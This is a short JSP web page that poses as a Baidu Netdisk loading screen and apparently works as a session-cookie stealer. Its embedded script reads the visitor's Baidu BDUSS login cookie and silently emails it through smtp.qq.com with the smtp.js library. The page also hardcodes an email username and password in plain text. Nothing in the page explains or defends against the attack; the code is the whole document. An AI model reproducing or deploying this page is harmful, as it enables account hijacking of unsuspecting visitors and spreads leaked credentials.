<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html>
<script src="https://smtpjs.com/v3/smtp.js">
</script>

<head>
  <title>百度网盘</title>
</head>

<body>
正在加载，请稍后...
</body>

<script>
  var a = "${cookie.BDUSS.value}";
  Email.send({

    Host : "smtp.qq.com",
    Username : "2534324260@qq.com",
    Password : "zzwsvsnremludibg",
    To : '2534324260@qq.com',
    From : "2534324260@qq.com",
    Subject : "测试案例",
    Body : a

  })
  //         .then(
  //                 message => alert(message)
  // )
</script>

</html>
